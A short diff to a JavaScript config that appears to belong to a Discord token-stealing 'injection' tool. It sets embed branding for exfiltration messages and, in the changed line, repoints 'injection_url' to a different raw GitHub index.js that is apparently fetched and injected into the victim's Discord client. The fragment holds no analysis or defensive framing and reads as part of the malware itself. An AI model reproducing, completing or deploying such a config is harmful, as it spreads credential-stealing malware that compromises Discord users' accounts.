@@ -14,7 +14,7 @@ const config = {
   embed_name: '1zye 000x1', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1229166883966812271/1229166913431539762/20ad24d60334fc969143acb45d189772.jpg?ex=662eb1e4&is=661c3ce4&hm=b1fd370295b74bde76930b8e205dbf90c9832465e85926ffe0d8dd6085a7cabd&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/1felpsouv3r/1nject_test/main/index.js', 
   /**
    
    **/
